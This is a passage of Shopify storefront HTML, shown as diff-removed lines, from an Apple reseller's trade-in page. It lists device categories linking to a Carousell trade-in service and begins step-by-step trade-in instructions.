-                                            <h1 class="rich-text__heading rte inline-richtext h2">
-                                              <strong>Explore the devices to Pelajari Selengkapnya.</strong>
-                                            </h1>
-                                        </div>
-                                      </div>
-                                  </div>
-                                </div>
-                                <style> #shopify-section-template--16932308091060__rich_text_i9f7na .rich-text__blocks {max-width: 100%;} </style>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__multicolumn_e4akte" class="shopify-section multicolumn_sec">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/section-multicolumn.css?v=46025948269339862011717736425" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__multicolumn_e4akte-padding {
-                                  padding-top: 24px;
-                                  padding-bottom: 27px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__multicolumn_e4akte-padding {
-                                  padding-top: 32px;
-                                  padding-bottom: 36px;
-                                  }
-                                  }
-                                </style>
-                                <div class="multicolumn color-background-1 gradient background-primary no-heading">
-                                  <div class="page-width section-template--16932308091060__multicolumn_e4akte-padding isolate">
-                                      <slider-component class="slider-mobile-gutter" style="display:block;">
-                                        <ul class="multicolumn-list contains-content-container grid grid--2-col-tablet-down grid--5-col-desktop slider slider--mobile grid--peek" id="Slider-template--16932308091060__multicolumn_e4akte" role="list">
-                                            <li id="Slide-template--16932308091060__multicolumn_e4akte-1" class="multicolumn-list__item grid__item slider__slide center">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
-                                                    <div class="media media--transparent media--square">
-                                                        <img src="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=3200" alt="" srcset="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=50 50w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=75 75w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=100 100w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=150 150w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=200 200w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=300 300w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=400 400w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=500 500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=750 750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=1000 1000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=1250 1250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=1500 1500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=1750 1750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=2000 2000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=2250 2250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=2500 2500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=2750 2750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=3000 3000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPhone_16_icon_3162f069-14d5-4b57-bda3-024991509e36.png?v=1726193576&amp;width=3200 3200w" width="3200" height="3200" loading="lazy" sizes="
-                                                          (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
-                                                          (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
-                                                          (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
-                                                          calc((100vw - 34px) * 0.5 / 2)
-                                                          " class="multicolumn-card__image">
-                                                    </div>
-                                                  </div>
-                                                  <div class="multicolumn-card__info">
-                                                    <a class="link animate-arrow" href="https://istudio.sellto.carousell.sg/trade-in-or-sell/iphone/apple">
-                                                        iPhone
-                                                        <span class="icon-wrap">
-                                                          <svg viewbox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="footer_mail_arrow icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </span>
-                                                    </a>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                            <li id="Slide-template--16932308091060__multicolumn_e4akte-2" class="multicolumn-list__item grid__item slider__slide center">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
-                                                    <div class="media media--transparent media--square">
-                                                        <img src="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=3200" alt="" srcset="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=50 50w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=75 75w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=100 100w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=150 150w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=200 200w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=300 300w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=400 400w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=500 500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=750 750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=1000 1000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=1250 1250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=1500 1500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=1750 1750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=2000 2000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=2250 2250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=2500 2500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=2750 2750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=3000 3000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_iPad_icon_001e9008-363f-446b-9c64-775f1a294750.png?v=1725870807&amp;width=3200 3200w" width="3200" height="3200" loading="lazy" sizes="
-                                                          (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
-                                                          (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
-                                                          (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
-                                                          calc((100vw - 34px) * 0.5 / 2)
-                                                          " class="multicolumn-card__image">
-                                                    </div>
-                                                  </div>
-                                                  <div class="multicolumn-card__info">
-                                                    <a class="link animate-arrow" href="https://istudio.sellto.carousell.sg/trade-in-or-sell/ipad/apple">
-                                                        iPad
-                                                        <span class="icon-wrap">
-                                                          <svg viewbox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="footer_mail_arrow icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </span>
-                                                    </a>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                            <li id="Slide-template--16932308091060__multicolumn_e4akte-3" class="multicolumn-list__item grid__item slider__slide center">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
-                                                    <div class="media media--transparent media--square">
-                                                        <img src="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=3200" alt="" srcset="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=50 50w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=75 75w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=100 100w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=150 150w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=200 200w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=300 300w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=400 400w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=500 500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=750 750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=1000 1000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=1250 1250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=1500 1500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=1750 1750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=2000 2000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=2250 2250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=2500 2500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=2750 2750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=3000 3000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_AirPods_icon_6d28a698-8424-474d-bb5c-437a27bbc58d.png?v=1725870807&amp;width=3200 3200w" width="3200" height="3200" loading="lazy" sizes="
-                                                          (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
-                                                          (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
-                                                          (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
-                                                          calc((100vw - 34px) * 0.5 / 2)
-                                                          " class="multicolumn-card__image">
-                                                    </div>
-                                                  </div>
-                                                  <div class="multicolumn-card__info">
-                                                    <a class="link animate-arrow" href="https://istudio.sellto.carousell.sg/trade-in-or-sell/earbuds/all">
-                                                        AirPods
-                                                        <span class="icon-wrap">
-                                                          <svg viewbox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="footer_mail_arrow icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </span>
-                                                    </a>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                            <li id="Slide-template--16932308091060__multicolumn_e4akte-4" class="multicolumn-list__item grid__item slider__slide center">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
-                                                    <div class="media media--transparent media--square">
-                                                        <img src="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=3200" alt="" srcset="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=50 50w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=75 75w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=100 100w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=150 150w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=200 200w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=300 300w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=400 400w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=500 500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=750 750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=1000 1000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=1250 1250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=1500 1500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=1750 1750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=2000 2000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=2250 2250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=2500 2500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=2750 2750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=3000 3000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Mac_icon_b84ffeee-0a97-475e-9fab-7ccaf403fdc3.png?v=1725870807&amp;width=3200 3200w" width="3200" height="3200" loading="lazy" sizes="
-                                                          (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
-                                                          (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
-                                                          (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
-                                                          calc((100vw - 34px) * 0.5 / 2)
-                                                          " class="multicolumn-card__image">
-                                                    </div>
-                                                  </div>
-                                                  <div class="multicolumn-card__info">
-                                                    <a class="link animate-arrow" href="https://istudio.sellto.carousell.sg/trade-in-or-sell/macbook/apple">
-                                                        MacBook
-                                                        <span class="icon-wrap">
-                                                          <svg viewbox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="footer_mail_arrow icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </span>
-                                                    </a>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                            <li id="Slide-template--16932308091060__multicolumn_e4akte-5" class="multicolumn-list__item grid__item slider__slide center">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
-                                                    <div class="media media--transparent media--square">
-                                                        <img src="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=3200" alt="" srcset="https://www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=50 50w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=75 75w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=100 100w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=150 150w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=200 200w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=300 300w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=400 400w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=500 500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=750 750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=1000 1000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=1250 1250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=1500 1500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=1750 1750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=2000 2000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=2250 2250w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=2500 2500w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=2750 2750w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=3000 3000w, //www.istudiosg.com/cdn/shop/files/Trade-in_Page_-_Apple_Watch_icon_19025b33-8940-4bef-b0d3-3aa38bec3692.png?v=1726737133&amp;width=3200 3200w" width="3200" height="3200" loading="lazy" sizes="
-                                                          (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
-                                                          (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
-                                                          (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
-                                                          calc((100vw - 34px) * 0.5 / 2)
-                                                          " class="multicolumn-card__image">
-                                                    </div>
-                                                  </div>
-                                                  <div class="multicolumn-card__info">
-                                                    <a class="link animate-arrow" href="https://istudio.sellto.carousell.sg/trade-in-or-sell/smartwatch/all">
-                                                        Watch
-                                                        <span class="icon-wrap">
-                                                          <svg viewbox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="footer_mail_arrow icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </span>
-                                                    </a>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                        </ul>
-                                        <div class="slider-buttons no-js-hidden medium-hide">
-                                            <button type="button" class="slider-button slider-button--prev" name="previous" aria-label="Slide left" disabled>
-                                              <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                              </svg>
-                                            </button>
-                                            <div class="slider-counter caption">
-                                              <span class="slider-counter--current">1</span>
-                                              <span aria-hidden="true"> / </span>
-                                              <span class="visually-hidden">of</span>
-                                              <span class="slider-counter--total">4</span>
-                                            </div>
-                                            <button type="button" class="slider-button slider-button--next" name="next" aria-label="Slide right">
-                                              <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                              </svg>
-                                            </button>
-                                        </div>
-                                      </slider-component>
-                                      <div class="center small-hide medium-hide"></div>
-                                  </div>
-                                </div>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__rich_text_j8MLf3" class="shopify-section section">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__rich_text_j8MLf3-padding {
-                                  padding-top: 18px;
-                                  padding-bottom: 0px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__rich_text_j8MLf3-padding {
-                                  padding-top: 24px;
-                                  padding-bottom: 0px;
-                                  }
-                                  }
-                                </style>
-                                <div class="isolate">
-                                  <div class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_j8MLf3-padding">
-                                      <div class="rich-text__wrapper rich-text__wrapper--center page-width">
-                                        <div class="rich-text__blocks center">
-                                            <h1 class="rich-text__heading rte inline-richtext h2">
-                                              <strong>Trade-in your device in 3 easy steps!</strong>
-                                            </h1>
-                                        </div>
-                                      </div>
-                                  </div>
-                                </div>
-                                <style> #shopify-section-template--16932308091060__rich_text_j8MLf3 .rich-text__blocks {max-width: 100%;} </style>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__multicolumn_BHFMrc" class="shopify-section multicolumn_sec">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/section-multicolumn.css?v=46025948269339862011717736425" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__multicolumn_BHFMrc-padding {
-                                  padding-top: 21px;
-                                  padding-bottom: 21px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__multicolumn_BHFMrc-padding {
-                                  padding-top: 28px;
-                                  padding-bottom: 28px;
-                                  }
-                                  }
-                                </style>
-                                <div class="multicolumn color-background-1 gradient background-primary no-heading">
-                                  <div class="page-width section-template--16932308091060__multicolumn_BHFMrc-padding isolate">
-                                      <slider-component class="slider-mobile-gutter" style="display:block;">
-                                        <ul class="multicolumn-list contains-content-container grid grid--1-col-tablet-down grid--3-col-desktop slider slider--mobile grid--peek" id="Slider-template--16932308091060__multicolumn_BHFMrc" role="list">
-                                            <li id="Slide-template--16932308091060__multicolumn_BHFMrc-1" class="multicolumn-list__item grid__item slider__slide">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__info">
-                                                    <h3 class="inline-richtext"><span style="text-decoration:underline"><strong>Step 1</strong></span></h3>
-                                                    <div class="rte">
-                                                        <p>Disconnect your Apple device from your connected devices and iCloud. For detailed instructions, refer to the <a href="https://support.apple.com/en-sg/118412" target="_blank" title="https://support.apple.com/en-sg/118412"><span style="text-decoration:underline">Removal Guide</span></a>.</p>
-                                                    </div>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                            <li id="Slide-template--16932308091060__multicolumn_BHFMrc-2" class="multicolumn-list__item grid__item slider__slide">
-                                              <div class="multicolumn-card content-container">
